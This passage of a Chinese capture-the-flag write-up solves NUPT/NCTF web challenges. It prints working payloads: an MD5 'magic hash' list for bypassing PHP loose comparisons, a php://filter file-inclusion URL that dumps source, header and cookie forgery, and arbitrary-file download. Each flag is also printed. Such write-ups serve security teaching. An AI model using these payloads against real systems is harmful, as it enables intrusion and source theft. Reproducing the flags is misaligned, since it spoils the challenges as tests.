</span></span><span style=display:flex><span>$a <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;a&#39;</span>];
</span></span><span style=display:flex><span>$md52 <span style=color:#f92672>=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>md5</span>($a);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($a)){
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($a <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;QNKCDZO&#39;</span> <span style=color:#f92672>&amp;&amp;</span> $md51 <span style=color:#f92672>==</span> $md52) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;nctf{*****************}&#34;</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;false!!!&#34;</span>;
</span></span><span style=display:flex><span>}}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;please input a&#34;</span>;}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><p>利用PHP弱类型，前人发现<em>md5(&lsquo;QNKCDZO&rsquo;)=&lsquo;0e830400451993494058024219903391&rsquo;</em>，<em>md5(&lsquo;240610708&rsquo;)=&lsquo;0e462097431906509019562988736854&rsquo;</em>，而因为使用松散比较的缘故，*var_dump(&lsquo;0e830400451993494058024219903391&rsquo;==&lsquo;0e462097431906509019562988736854&rsquo;);*值为真，因此访问 <em><a href="http://chinalover.sinaapp.com/web19/?a=240610708">http://chinalover.sinaapp.com/web19/?a=240610708</a></em> 即可。</p><p>1、在PHP中，@被称为错误控制操作符(<a href=http://php.net/manual/en/language.operators.errorcontrol.php>error control operator</a>)，前置@符号的表达式产生的任何错误都将被忽略。</p><p>2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明<a href=https://en.wikipedia.org/wiki/Length_extension_attack>不安全</a>后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位十六进制串，由[0-9a-e]组成。</p><p>3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换(<a href=http://php.net/manual/en/language.types.type-juggling.php>type juggling</a>)而后者不会。这种juggle总的来说利大于弊，但确实容易<a href=https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf>玩脱</a>。</p><p>​ 此处只谈涉及字符串和数值的松散比较。根据本地实验结合官方文档，我们可以总结出来，这种类型转换的行为关键在于两点，一是判断字符串是否处于数字语境(in a numeric context)，二是如何为处于数字语境的字符串取值。</p><p>​ 当操作符为<code>==</code>时，若有一个操作数为<code>int/float</code>或两个操作数<code>is_numeric()</code>均为真，则判断为处于数字语境；当操作符为数字操作符，如<code>+-/*</code>时，则判断为处于数字语境。（此段为实验支持下的个人猜测，未找到依据。）</p><p>​ 根据PHP<a href=http://php.net/manual/en/language.types.string.php#language.types.string.conversion>官方文档</a> ，如果一个字符串被认定处于数字语境，那么它的取值取决于字符串的前面一部分，如果字符串以有效的数字型数据【<a href=http://php.net/manual/en/language.types.string.php#language.types.string.conversion>Valid numeric data</a> ，正则匹配表达为 <code>\s(\d+\.?\d*|\.\d+)([eE]\d+)?\s</code>，含有[eE]的视为科学计数法】开头，那么字符串取开头部分的数值，否则取0 。实验发现<code>1e</code>也被取值为1而不是0，这有点奇怪 :(</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-15>15</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span> $a1<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>;         $b1<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1&#34;</span>;        $c1<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1padding&#34;</span>;
</span></span><span style=display:flex><span> $a2<span style=color:#f92672>=.</span><span style=color:#ae81ff>1</span>;        $b2<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;.1&#34;</span>;       $c2<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;.1padding&#34;</span>;
</span></span><span style=display:flex><span> $a3<span style=color:#f92672>=</span><span style=color:#ae81ff>1.</span>;        $b3<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.&#34;</span>;       $c3<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.padding&#34;</span>;
</span></span><span style=display:flex><span> $a4<span style=color:#f92672>=</span><span style=color:#ae81ff>1.1</span>;       $b4<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.1&#34;</span>;      $c4<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.1padding&#34;</span>;
</span></span><span style=display:flex><span> $a5<span style=color:#f92672>=</span><span style=color:#ae81ff>1.e1</span>;      $b5<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.e1&#34;</span>;     $c5<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.e1padding&#34;</span>; 
</span></span><span style=display:flex><span> $a6<span style=color:#f92672>=.</span><span style=color:#ae81ff>1e1</span>;      $b6<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;.1e1&#34;</span>;     $c6<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;.1e1padding&#34;</span>;
</span></span><span style=display:flex><span> $a7<span style=color:#f92672>=</span><span style=color:#ae81ff>1.1e1</span>;     $b7<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.1e1&#34;</span>;    $c7<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.1e1padding&#34;</span>;
</span></span><span style=display:flex><span> $a8<span style=color:#f92672>=</span><span style=color:#ae81ff>1e1</span>;       $b8<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1e1&#34;</span>;      $c8<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1e1padding&#34;</span>;
</span></span><span style=display:flex><span> <span style=color:#a6e22e>var_dump</span>($a8<span style=color:#f92672>==</span>$b8);<span style=color:#75715e>//true
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>var_dump</span>($a8<span style=color:#f92672>==</span>$c8);<span style=color:#75715e>//true
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>var_dump</span>($b8<span style=color:#f92672>==</span>$c8);<span style=color:#75715e>//false
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>var_dump</span>($a8<span style=color:#f92672>+</span>$b8);<span style=color:#75715e>//float(20)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>var_dump</span>($a8<span style=color:#f92672>+</span>$c8);<span style=color:#75715e>//float(20)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> <span style=color:#a6e22e>var_dump</span>($b8<span style=color:#f92672>+</span>$c8);<span style=color:#75715e>//float(20) 
</span></span></span></code></pre></td></tr></table></div></div><p>4、其他符合<code>/0[eE]\d{30}/</code>的MD5值：</p><table><thead><tr><th style=text-align:left>string(strlen($var)) $var</th><th style=text-align:left>string(strlen(md5($var))) md5($var)</th></tr></thead><tbody><tr><td style=text-align:left>QNKCDZO</td><td style=text-align:left>0e830400451993494058024219903391</td></tr><tr><td style=text-align:left>s878926199a</td><td style=text-align:left>0e545993274517709034328855841020</td></tr><tr><td style=text-align:left>s155964671a</td><td style=text-align:left>0e342768416822451524974117254469</td></tr><tr><td style=text-align:left>s1502113478a</td><td style=text-align:left>0e861580163291561247404381396064</td></tr><tr><td style=text-align:left>s214587387a</td><td style=text-align:left>0e848240448830537924465865611904</td></tr><tr><td style=text-align:left>s878926199a</td><td style=text-align:left>0e545993274517709034328855841020</td></tr><tr><td style=text-align:left>s1091221200a</td><td style=text-align:left>0e940624217856561557816327384675</td></tr><tr><td style=text-align:left>s1885207154a</td><td style=text-align:left>0e509367213418206700842008763514</td></tr><tr><td style=text-align:left>s1836677006a</td><td style=text-align:left>0e481036490867661113260034900752</td></tr><tr><td style=text-align:left>s1184209335a</td><td style=text-align:left>0e072485820392773389523109082030</td></tr><tr><td style=text-align:left>s1665632922a</td><td style=text-align:left>0e731198061491163073197128363787</td></tr><tr><td style=text-align:left>s532378020a</td><td style=text-align:left>0e220463095855511507588041205815</td></tr><tr><td style=text-align:left>240610708</td><td style=text-align:left>0e462097431906509019562988736854</td></tr></tbody></table><h4 id=签到2httpteamxlcsinaappcomweb102298884f0724c04293b4d8c0178615eindexphp><a href=http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php>签到2</a><a hidden class=anchor aria-hidden=true href=#签到2httpteamxlcsinaappcomweb102298884f0724c04293b4d8c0178615eindexphp>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-8>8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-9>9</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>http-equiv</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Content-Type&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/html; charset=UTF-8&#34;</span> /&gt;
</span></span><span style=display:flex><span>尚未登录或口令错误
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./index.php&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>p</span>&gt;输入框：&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text1&#34;</span> <span style=color:#a6e22e>maxlength</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;10&#34;</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	请输入口令：zhimakaimen
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;开门&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>form</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p><em>nctf{follow_me_to_exploit}</em></p><p><em>maxlength=&ldquo;10&rdquo;</em> 而口令 <em>zhimakaimen</em> 有11位，数据在前端就会被截断掉。这时有两种做法，一种是在chrome/Firefox浏览器的开发者工具中将 <em>maxlength=&ldquo;10&rdquo;</em> 字段修改为 <em>maxlength=&ldquo;11&rdquo;</em> 或是更大的值；另一种是使用hackbar或burp直接向 <a href=http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php>http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php</a> post <em>text1=zhimakaimen</em> 。客户端的行为都是可控的，所以熟悉HTML和JavaScript是重要的。</p><h4 id=这题不是webhttpchinaloversinaappcomweb2indexhtml><a href=http://chinalover.sinaapp.com/web2/index.html>这题不是WEB</a><a hidden class=anchor aria-hidden=true href=#这题不是webhttpchinaloversinaappcomweb2indexhtml>#</a></h4><p><em>nctf{photo_can_also_hid3_msg}</em></p><p>下载图片并用winhex打开，在末尾发现字符串。一个简单的隐写。</p><h4 id=层层递进httpchinaloversinaappcomweb3><a href=http://chinalover.sinaapp.com/web3/>层层递进</a><a hidden class=anchor aria-hidden=true href=#层层递进httpchinaloversinaappcomweb3>#</a></h4><p><em>nctf{this_is_a_fl4g}</em></p><p>查看源代码，跟随链接，依次访问<code>SO.html</code> -> <code>S0.html</code>-><code>SO.htm</code> -><code>S0.htm</code>-><code>404.html</code> ，在最后一个页面里的注释部分可找到flag。还是查看源代码，细心就会发现异常。</p><h4 id=aaencodehttpchinaloversinaappcomweb20aaencodetxt><a href=http://chinalover.sinaapp.com/web20/aaencode.txt>AAencode</a><a hidden class=anchor aria-hidden=true href=#aaencodehttpchinaloversinaappcomweb20aaencodetxt>#</a></h4><p><em>nctf{javascript_aaencode}</em></p><p>aaencode是一种把js代码编码成日语颜文字的编码方式，使用Unicode编码查看，然后 <a href=http://tool.isex.ren/aadecode>在线解码</a> 。工具作者颇有幽默感。</p><h4 id=单身二十年httpchinaloversinaappcomweb8><a href=http://chinalover.sinaapp.com/web8/>单身二十年</a><a hidden class=anchor aria-hidden=true href=#单身二十年httpchinaloversinaappcomweb8>#</a></h4><p><em>nctf{yougotit_script_now}</em></p><p>访问 <em><a href=http://chinalover.sinaapp.com/web8/search_key.php>http://chinalover.sinaapp.com/web8/search_key.php</a></em> 会被重定向到 <em><a href=http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php>http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</a></em> ，重定向会被浏览器自动处理，burp抓包则可见flag。</p><h4 id=你从哪里来httpchinaloversinaappcomweb22><a href=http://chinalover.sinaapp.com/web22/>你从哪里来</a><a hidden class=anchor aria-hidden=true href=#你从哪里来httpchinaloversinaappcomweb22>#</a></h4><blockquote><p>你是从 google 来的吗？
传送门：<a href=http://chinalover.sinaapp.com/web22/>题目地址</a></p></blockquote><p><em>nctf{http_referer}</em></p><p>给请求加上<code>referer: https://www.google.com</code>即可。从<em><a href=https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php>https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php</a></em> 看到源代码可能有点问题。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$referer <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;referer&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($referer <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;https://www.google.com/ &#34;</span> <span style=color:#f92672>||</span> $referer <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;https://www.google.com&#34;</span>){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;nctf{http_referer}&#34;</span>;
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;are you from google?&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><p>第二行应该是<code> $referer = $_SERVER['HTTP_REFERER'];</code> ？</p><h4 id=php-decode>php decode<a hidden class=anchor aria-hidden=true href=#php-decode>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-8>8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-9>9</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>CLsI</span>($ZzvSWE)
</span></span><span style=display:flex><span> {
</span></span><span style=display:flex><span>    $ZzvSWE <span style=color:#f92672>=</span> <span style=color:#a6e22e>gzinflate</span>(<span style=color:#a6e22e>base64_decode</span>($ZzvSWE));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>strlen</span>($ZzvSWE); $i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        $ZzvSWE[$i] <span style=color:#f92672>=</span> <span style=color:#a6e22e>chr</span>(<span style=color:#a6e22e>ord</span>($ZzvSWE[$i]) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $ZzvSWE;}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>CLsI</span>(<span style=color:#e6db74>&#34;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&#34;</span>);
</span></span></code></pre></td></tr></table></div></div><p><em>nctf{gzip_base64_hhhhhh}</em></p><p>运行代码即可。</p><h4 id=文件包含http4chinaloversinaappcomweb7indexphp><a href=http://4.chinalover.sinaapp.com/web7/index.php>文件包含</a><a hidden class=anchor aria-hidden=true href=#文件包含http4chinaloversinaappcomweb7indexphp>#</a></h4><p><em>nctf{edulcni_elif_lacol_si_siht}</em></p><p>使用PHP的<a href=http://php.net/manual/en/wrappers.php.php#wrappers.php.filter>filter</a>协议读取index.php，即访问 <em><a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</a></em> ，将得到的字符串base64解码。</p><h4 id=单身一百年也没用httpchinaloversinaappcomweb9><a href=http://chinalover.sinaapp.com/web9/>单身一百年也没用</a><a hidden class=anchor aria-hidden=true href=#单身一百年也没用httpchinaloversinaappcomweb9>#</a></h4><p><em>nctf{this_is302redirect}</em></p><p>flag藏在响应头中。</p><h4 id=downloadhttpwaynuptzjcnweb6><a href=http://way.nuptzj.cn/web6/>Download~!</a><a hidden class=anchor aria-hidden=true href=#downloadhttpwaynuptzjcnweb6>#</a></h4><p><em>nctf{download_any_file_666}</em></p><p>访问 <em><a href="http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name">http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name</a></em> 可以下载允许下载的任意文件，所以先下载download.php，得到白名单列表里有hereiskey.php，再下载下来就可见flag。</p><h4 id=cookiehttpchinaloversinaappcomweb10indexphp><a href=http://chinalover.sinaapp.com/web10/index.php>COOKIE</a><a hidden class=anchor aria-hidden=true href=#cookiehttpchinaloversinaappcomweb10indexphp>#</a></h4><p><em>nctf{cookie_is_different_from_session}</em></p><p>看到响应头中有<code>Set-Cookie: Login=0</code>，因此在请求头加入<code>Cookie: Login=1</code>即可。</p><h4 id=mysqlhttpchinaloversinaappcomweb11><a href=http://chinalover.sinaapp.com/web11/>MYSQL</a><a hidden class=anchor aria-hidden=true href=#mysqlhttpchinaloversinaappcomweb11>#</a></h4><p><em>nctf{query_in_mysql}</em></p><p>根据提示查看robots.txt，内容如下</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td 